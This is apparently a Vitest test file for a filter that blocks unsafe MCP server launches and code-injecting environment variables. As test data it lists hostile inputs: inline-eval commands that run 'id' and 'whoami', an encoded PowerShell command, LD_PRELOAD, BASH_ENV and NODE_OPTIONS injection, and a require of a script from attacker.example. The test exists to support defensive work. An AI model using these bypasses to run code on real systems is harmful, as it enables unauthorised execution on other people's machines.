import { describe, expect, it } from "vitest";
import { describeBlockedMcpEnv, describeBlockedMcpLaunch } from "./mcp.js";

describe("describeBlockedMcpLaunch", () => {
  it("blocks Node inline-eval flags with attached values", () => {
    expect(describeBlockedMcpLaunch("node", ["--eval=console.log('safe-marker')"]))
      .toContain("Inline eval for node");
    expect(describeBlockedMcpLaunch("node", ["-e=console.log('safe-marker')"]))
      .toContain("Inline eval for node");
  });

  it("continues to block separated Node inline-eval flags", () => {
    expect(describeBlockedMcpLaunch("node", ["--eval", "console.log('safe-marker')"]))
      .toContain("Inline eval for node");
    expect(describeBlockedMcpLaunch("node", "-e \"console.log('safe-marker')\""))
      .toContain("Inline eval for node");
  });

  it("blocks Deno's eval subcommand and permits regular script launches", () => {
    expect(describeBlockedMcpLaunch("deno", ["eval", "console.log('safe-marker')"]))
      .toContain("Inline eval for deno");
    expect(describeBlockedMcpLaunch("node", ["server.js"])).toBe("");
  });

  it("blocks inline-code bypasses found in the security audit", () => {
    expect(describeBlockedMcpLaunch("node", ["-p", "require('child_process').execSync('id')"])).toContain("Inline eval");
    expect(describeBlockedMcpLaunch("node", ["--print=1"])).toContain("Inline eval");
    expect(describeBlockedMcpLaunch("node", ["-pe", "1"])).toContain("Inline eval");
    expect(describeBlockedMcpLaunch("node", ["--import=data:text/javascript,process.exit(1)"])).toContain("preload");
    expect(describeBlockedMcpLaunch("python3", ["-cimport os;os.system('id')"])).toContain("python");
    expect(describeBlockedMcpLaunch("python3", ["-Bc", "print(1)"])).toContain("python");
    expect(describeBlockedMcpLaunch("python3", ["-mpip", "install", "x"])).toContain("python");
    expect(describeBlockedMcpLaunch("python3", ["--check-hash-based-pycs", "default", "-c", "x"])).toContain("python");
    expect(describeBlockedMcpLaunch("pwsh", ["-c", "whoami"])).toContain("PowerShell");
    expect(describeBlockedMcpLaunch("powershell", ["-Comm", "whoami"])).toContain("PowerShell");
    expect(describeBlockedMcpLaunch("powershell", ["-ec", "dwBoAG8AYQBtAGkA"])).toContain("PowerShell");
    expect(describeBlockedMcpLaunch("powershell", ["Get-Process"])).toContain("PowerShell");
    expect(describeBlockedMcpLaunch("cmd", ["/s", "/c", "whoami"])).toContain("cmd");
  });

  it("keeps ordinary MCP launches working", () => {
    expect(describeBlockedMcpLaunch("npx", ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"])).toBe("");
    expect(describeBlockedMcpLaunch("node", ["-r", "dotenv/config", "server.js"])).toBe("");
    expect(describeBlockedMcpLaunch("python3", ["-m", "mcp_server_fetch"])).toBe("");
    expect(describeBlockedMcpLaunch("python3", ["-W", "ignore", "server.py"])).toBe("");
    expect(describeBlockedMcpLaunch("uvx", ["mcp-server-time"])).toBe("");
    expect(describeBlockedMcpLaunch("pwsh", ["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "server.ps1", "-Command", "x"])).toBe("");
  });

  it("blocks environment variables that inject code into allowed launchers", () => {
    expect(describeBlockedMcpEnv("NODE_OPTIONS=--import=data:text/javascript,1")).toContain("NODE_OPTIONS");
    expect(describeBlockedMcpEnv("NODE_OPTIONS=--require https://attacker.example/x.js")).toContain("NODE_OPTIONS");
    expect(describeBlockedMcpEnv({ LD_PRELOAD: "/tmp/x.so" })).toContain("LD_PRELOAD");
    expect(describeBlockedMcpEnv("DYLD_INSERT_LIBRARIES=/tmp/x.dylib")).toContain("DYLD_INSERT_LIBRARIES");
    expect(describeBlockedMcpEnv("GITHUB_TOKEN=ghp_x\nNODE_OPTIONS=--max-old-space-size=4096")).toBe("");
    expect(describeBlockedMcpLaunch("npx", ["-y", "pkg"], "BASH_ENV=/tmp/x.sh")).toContain("BASH_ENV");
  });
});
